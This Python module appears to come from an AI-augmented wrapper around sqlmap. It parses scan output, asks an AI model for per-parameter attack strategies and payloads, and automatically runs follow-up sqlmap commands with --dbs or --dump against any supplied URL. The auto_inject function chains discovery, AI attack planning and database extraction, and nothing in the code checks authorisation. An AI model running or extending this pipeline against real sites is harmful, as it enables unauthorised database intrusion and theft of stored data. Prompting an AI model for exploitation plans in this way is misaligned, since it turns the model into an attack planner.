import os
import re
import subprocess
import sys
import tempfile
import json
import logging
from datetime import datetime
from .config import load_config, get_api_key, validate_config
from .ai_integration import call_ai_model, generate_smart_payload, analyze_injection_results
from .i18n import _
from pathlib import Path

logger = logging.getLogger('sqlmap.ai')

class SQLMapOutputParser:
    """专门用于解析SQLMap输出的结构化解析器"""
    
    @staticmethod
    def extract_injection_points(output):
        """
        提取注入点信息
        返回格式: [{'parameter': 'id', 'type': 'boolean-based', 'title': 'AND boolean-based...'}]
        """
        injection_points = []
        
        # 提取Parameter块
        injection_blocks = re.finditer(r"Parameter:\s*([^\n]+).*?Payload:.*?([^\n]+)", output, re.DOTALL | re.IGNORECASE)
        
        for block in injection_blocks:
            full_block = block.group(0)
            
            # 提取参数名
            param_match = re.search(r"Parameter:\s*'?([^'\s]+)'?", full_block)
            if not param_match:
                continue
            
            param = param_match.group(1).strip()
            
            # 提取类型
            type_match = re.search(r"Type:\s*([^(,\n]+)", full_block)
            vuln_type = type_match.group(1).strip() if type_match else "unknown"
            
            # 提取标题
            title_match = re.search(r"Title:\s*([^\n]+)", full_block)
            title = title_match.group(1).strip() if title_match else "SQL注入漏洞"
            
            # 构建并添加注入点
            injection_points.append({
                'parameter': param,
                'type': vuln_type,
                'title': title,
                'payload': block.group(2).strip() if len(block.groups()) > 1 else ""
            })
        
        # 如果未找到标准格式，尝试其他可能的格式
        if not injection_points:
            # 尝试简化格式
            simple_matches = re.finditer(r"parameter\s*'([^']+)'\s*is\s*([^(,\n]+)", output, re.IGNORECASE)
            for match in simple_matches:
                injection_points.append({
                    'parameter': match.group(1).strip(),
                    'type': match.group(2).strip(),
                    'title': "SQL注入漏洞"
                })
            
            # 中文格式（AI分析结果）
            cn_matches = re.finditer(r"注入点是\s*([^\s,\n]+).*?类型是\s*([^\s,\n]+)", output, re.IGNORECASE)
            for match in cn_matches:
                injection_points.append({
                    'parameter': match.group(1).strip(),
                    'type': match.group(2).strip(),
                    'title': "SQL注入漏洞"
                })
        
        # 如果仍未找到注入点，但有SQL注入相关内容，尝试解析基本信息
        if not injection_points and ("sql injection" in output.lower() or "注入漏洞" in output):
            param_match = re.search(r"parameter[:\s]*'([^']+)'", output, re.IGNORECASE)
            id_match = re.search(r"(\bid\b|\bparam\b)[\s:]*([^\s,]+)", output, re.IGNORECASE)
            
            if param_match:
                injection_points.append({
                    'parameter': param_match.group(1),
                    'type': "unknown",
                    'title': "SQL注入漏洞"
                })
            elif id_match:
                injection_points.append({
                    'parameter': id_match.group(2),
                    'type': "unknown", 
                    'title': "SQL注入漏洞"
                })
        
        return injection_points
    
    @staticmethod
    def extract_dbms(output):
        """提取数据库类型信息"""
        # 按优先级尝试多种模式
        dbms_patterns = [
            r"back-end DBMS:\s*([^\n]+)",
            r"the back-end DBMS is\s*([^\n.]+)",
            r"DBMS\s*=\s*([^\s,\n]+)",
            r"数据库类型是\s*([^\s,\n]+)",
            r"DBMS fingerprint:\s*([^\n]+)"
        ]
        
        for pattern in dbms_patterns:
            dbms_match = re.search(pattern, output, re.IGNORECASE)
            if dbms_match:
                # 清理结果，移除版本信息等
                dbms_full = dbms_match.group(1).strip()
                # 提取主要数据库类型（如MySQL, PostgreSQL等）
                dbms_main = dbms_full.split()[0].lower() if ' ' in dbms_full else dbms_full.lower()
                return dbms_main
        
        return "unknown"
    
    @staticmethod
    def extract_tables(output):
        """提取数据库表信息"""
        tables = []
        
        # 查找表列表块
        table_blocks = re.finditer(r"Database:\s*([^\n]+)\s*\[(\d+)\s+tables?\].*?\+([-]+)\+(.*?)(?:\n\n|\Z)", 
                                 output, re.DOTALL)
        
        for block in table_blocks:
            db_name = block.group(1).strip()
            table_count = int(block.group(2))
            
            # 提取表名
            table_section = block.group(4)
            table_names = re.findall(r"\|\s*([^|]+?)\s*\|", table_section)
            
            tables.append({
                'database': db_name,
                'table_count': table_count,
                'tables': [name.strip() for name in table_names if name.strip()]
            })
        
        return tables
    
    @staticmethod
    def extract_databases(output):
        """提取数据库名称列表"""
        databases = []
        
        # 查找数据库块
        db_match = re.search(r"available databases \[(\d+)\]:(.*?)(?:\n\n|\[\*\] ending|\Z)", 
                            output, re.DOTALL)
        
        if db_match:
            db_count = int(db_match.group(1))
            db_section = db_match.group(2)
            
            # 提取数据库名
            db_names = re.findall(r"\[\*\]\s*([^\n]+)", db_section)
            databases = [name.strip() for name in db_names if name.strip()]
        
        return databases
    
    @staticmethod
    def extract_data(output):
        """提取表数据"""
        data_blocks = []
        
        # 查找数据块
        data_sections = re.finditer(r"Database:\s*([^\n]+)\nTable:\s*([^\n]+)\s*\[(\d+)\s+entries\].*?\+([-]+\+)+\n(.*?)(?:\n\n|\Z)", 
                                   output, re.DOTALL)
        
        for section in data_sections:
            db_name = section.group(1).strip()
            table_name = section.group(2).strip()
            entry_count = int(section.group(3))
            data_rows = section.group(5)
            
            # 提取列名
            header_match = re.search(r"\|(.*?)\|", data_rows)
            columns = []
            if header_match:
                columns = [col.strip() for col in header_match.group(1).split('|') if col.strip()]
            
            # 提取数据行
            rows = []
            data_lines = data_rows.strip().split('\n')
            if len(data_lines) > 2:  # 头部，分隔符，然后是数据行
                for i in range(2, len(data_lines)):
                    line = data_lines[i]
                    row_values = [val.strip() for val in re.findall(r"\|\s*([^|]*?)\s*\|", line)]
                    if row_values:
                        rows.append(row_values)
            
            data_blocks.append({
                'database': db_name,
                'table': table_name,
                'entries': entry_count,
                'columns': columns,
                'rows': rows
            })
        
        return data_blocks
    
    @staticmethod
    def parse_scan_results(output):
        """完整解析SQLMap输出"""
        return {
            'injection_points': SQLMapOutputParser.extract_injection_points(output),
            'dbms': SQLMapOutputParser.extract_dbms(output),
            'databases': SQLMapOutputParser.extract_databases(output),
            'tables': SQLMapOutputParser.extract_tables(output),
            'data': SQLMapOutputParser.extract_data(output),
            'timestamp': datetime.now().isoformat()
        }

def analyze_vulnerability(scan_info):
    """分析漏洞，使用AI生成攻击策略"""
    if not scan_info['injection_points']:
        return "未发现注入点，无法进行自动注入"
    
    dbms = scan_info['dbms']
    points = scan_info['injection_points']
    
    prompt = f"""
我发现了以下SQL注入点，请分析并提供针对性的攻击策略:

数据库类型: {dbms}
注入点数量: {len(points)}

注入点详情:
"""
    
    for i, point in enumerate(points, 1):
        # 添加payload信息（如果有）
        payload_info = f", Payload: {point.get('payload', 'N/A')}" if 'payload' in point else ""
        prompt += f"{i}. 参数: {point['parameter']}, 类型: {point['type']}, 描述: {point['title']}{payload_info}\n"
    
    # 添加数据库信息（如果有）
    if 'databases' in scan_info and scan_info['databases']:
        prompt += f"\n发现的数据库: {', '.join(scan_info['databases'])}\n"
    
    # 添加表信息（如果有）
    if 'tables' in scan_info and scan_info['tables']:
        prompt += "\n数据库表信息:\n"
        for db_info in scan_info['tables']:
            prompt += f"数据库 {db_info['database']}: {', '.join(db_info['tables'])}\n"
    
    prompt += """
请提供:
1. 每个注入点的最优攻击方式
2. 推荐的payload
3. 预期的数据提取方法
4. 攻击的风险评估
5. 防御建议
"""
    
    try:
        result = call_ai_model(prompt)
        return result
    except Exception as e:
        logger.error(f"AI分析失败: {str(e)}")
        return f"AI分析失败: {str(e)}"

def generate_inject_command(url, scan_info, options=None):
    """根据扫描信息生成注入命令"""
    if not scan_info['injection_points']:
        return None
    
    # 使用第一个注入点生成命令
    point = scan_info['injection_points'][0]
    dbms = scan_info['dbms']
    
    # 确保参数名称格式正确
    param = point['parameter']
    # 清理参数名，保留纯参数名
    param = re.sub(r"[，,:\s]+.*$", "", param)
    param = param.strip()
    
    # 基本的sqlmap命令
    cmd = ["python", "sqlmap.py", "-u", url]
    
    # 添加参数信息
    cmd.extend(["-p", param])
    
    # 添加数据库类型
    if dbms and dbms.lower() != "unknown":
        # 清理数据库类型字符串，确保只使用有效名称
        allowed_dbms = ["mysql", "postgresql", "mssql", "oracle", "sqlite", 
                        "db2", "firebird", "sybase", "maxdb", "access"]
        cleaned_dbms = next((db for db in allowed_dbms if dbms.lower().startswith(db)), "mysql")
        cmd.extend(["--dbms", cleaned_dbms])
    
    # 添加扫描选项
    config = load_config()
    level = options.get('level', 3) if options else 3
    risk = options.get('risk', 2) if options else 2
    
    cmd.extend(["--level", str(level)])
    cmd.extend(["--risk", str(risk)])
    
    # 添加其他选项
    if options:
        for option, value in options.items():
            if option not in ['dbms', 'level', 'risk']:  # 避免重复添加已设置的参数
                if value is True:
                    cmd.append(f"--{option}")
                elif value is not False and value is not None:
                    cmd.extend([f"--{option}", str(value)])
    
    return cmd

def auto_inject(url, options=None):
    """执行自动扫描和注入过程"""
    if options is None:
        options = {}
    
    # 加载配置
    config = load_config()
    
    # 获取超时设置
    timeout_config = config['TIMEOUTS'] if 'TIMEOUTS' in config else {}
    timeouts = {
        'api': int(timeout_config.get('api_call_timeout', 30)),
        'command': int(timeout_config.get('command_execution_timeout', 300)),
        'short': int(timeout_config.get('command_execution_short_timeout', 60)),
        'long': int(timeout_config.get('command_execution_long_timeout', 900))
    }
    
    # 根据操作类型选择超时
    if options.get("dump", False) or options.get("dbs", False):
        command_timeout = timeouts['long']  # 数据提取操作使用更长的超时
    elif options.get("quick", False):
        command_timeout = timeouts['short']  # 快速模式使用较短的超时
    else:
        command_timeout = timeouts['command']  # 默认超时
    
    # 自定义超时优先
    if "timeout" in options:
        try:
            command_timeout = int(options["timeout"])
        except (ValueError, TypeError):
            logger.warning(f"无效的超时值: {options['timeout']}，使用默认值: {command_timeout}")
    
    results = {
        'scan_output': '',
        'analysis': '',
        'injection_output': '',
        'success': False,
        'timestamp': datetime.now().isoformat()
    }
    
    # 步骤1: 进行扫描
    logger.info(_("开始扫描目标URL以寻找SQL注入漏洞: {}").format(url))
    print(_("[*] 开始扫描目标URL以寻找SQL注入漏洞..."))
    
    # 构建扫描命令
    scan_cmd = [
        "python", "sqlmap.py", 
        "-u", url, 
        "--batch",
        "--level", str(options.get("level", 3)),
        "--risk", str(options.get("risk", 2)),
        "--technique", options.get("technique", "BEUSTQ"),  # 默认使用所有技术
        "--threads", str(options.get("threads", 3))
    ]
    
    # 添加额外选项
    if "dbms" in options:
        scan_cmd.extend(["--dbms", options["dbms"]])
    
    if options.get("verbose", False):
        scan_cmd.append("-v")
    
    if options.get("smart", True):
        scan_cmd.append("--smart")
    
    try:
        # 提示即将执行的命令
        cmd_str = " ".join(scan_cmd)
        logger.info(_("执行命令: {}").format(cmd_str))
        print(_("[*] 执行命令: {}").format(cmd_str))
        
        # 执行扫描命令
        scan_process = subprocess.Popen(
            scan_cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            bufsize=1  # 行缓冲
        )
        
        # 使用超时参数确保不会无限等待
        try:
            scan_output, scan_error = scan_process.communicate(timeout=command_timeout)
            
            # 保存扫描结果
            results['scan_output'] = scan_output
            if scan_error:
                results['scan_error'] = scan_error
                
            # 解析扫描结果
            scan_info = SQLMapOutputParser.parse_scan_results(scan_output)
            
            # 记录解析结果
            results['scan_info'] = scan_info
            
            # 检查是否找到注入点
            if scan_info['injection_points']:
                logger.info(_("发现 {} 个SQL注入点").format(len(scan_info['injection_points'])))
                print(_("[+] 发现 {} 个SQL注入点").format(len(scan_info['injection_points'])))
                
                # 生成注入命令
                inject_cmd = generate_inject_command(url, scan_info, options)
                
                # 根据用户选项添加额外参数
                if options.get("dbs", False):
                    inject_cmd.append("--dbs")
                elif options.get("dump", False):
                    inject_cmd.append("--dump")
                
                if "tables" in options:
                    inject_cmd.extend(["--tables", options["tables"]])
                
                # 提示注入命令
                inject_cmd_str = " ".join(inject_cmd)
                logger.info(_("执行注入命令: {}").format(inject_cmd_str))
                print(_("[*] 执行注入命令: {}").format(inject_cmd_str))
                
                # 执行注入命令
                inject_process = subprocess.Popen(
                    inject_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    bufsize=1
                )
                
                # 使用适当的超时
                inject_output, inject_error = inject_process.communicate(timeout=command_timeout)
                
                # 保存注入结果
                results['injection_output'] = inject_output
                if inject_error:
                    results['injection_error'] = inject_error
                
                # 解析注入结果
                inject_info = SQLMapOutputParser.parse_scan_results(inject_output)
                results['injection_info'] = inject_info
                
                # 检查注入是否成功
                if inject_process.returncode == 0:
                    results['success'] = True
                    
                    # 生成摘要
                    summary = []
                    if 'databases' in inject_info and inject_info['databases']:
                        summary.append(_("获取到 {} 个数据库").format(len(inject_info['databases'])))
                        
                    if 'tables' in inject_info and inject_info['tables']:
                        total_tables = sum(item['table_count'] for item in inject_info['tables'])
                        summary.append(_("发现 {} 个数据表").format(total_tables))
                        
                    if 'data' in inject_info and inject_info['data']:
                        total_entries = sum(item['entries'] for item in inject_info['data'])
                        summary.append(_("提取了 {} 条数据记录").format(total_entries))
                        
                    if summary:
                        print(_("[+] 注入成功: {}").format(", ".join(summary)))
                    else:
                        print(_("[+] 注入成功，确认了漏洞存在"))
                        
                    # 生成AI分析
                    if options.get("analyze", True):
                        print(_("[*] 正在分析注入结果..."))
                        try:
                            analysis = analyze_injection_results(inject_output, scan_info)
                            results['analysis'] = analysis
                            print(_("[+] 分析完成"))
                        except Exception as e:
                            logger.error(f"分析注入结果失败: {e}")
                            print(_("[-] 分析失败: {}").format(str(e)))
                else:
                    print(_("[-] 注入执行失败，返回码: {}").format(inject_process.returncode))
                    if inject_error:
                        print(_("错误信息: {}").format(inject_error[:200]))
            else:
                logger.info(_("未发现SQL注入点"))
                print(_("[-] 未发现SQL注入点"))
                results['analysis'] = "未发现SQL注入漏洞"
                
            return results
            
        except subprocess.TimeoutExpired:
            scan_process.kill()
            logger.warning(_("执行超时，已终止进程"))
            print(_("[-] 执行超时，已终止进程"))
            results['error'] = "执行超时"
            return results
            
    except Exception as e:
        logger.error(f"自动注入过程中发生错误: {e}")
        print(_("[-] 自动注入过程中发生错误: {}").format(str(e)))
        results['error'] = str(e)
        return results
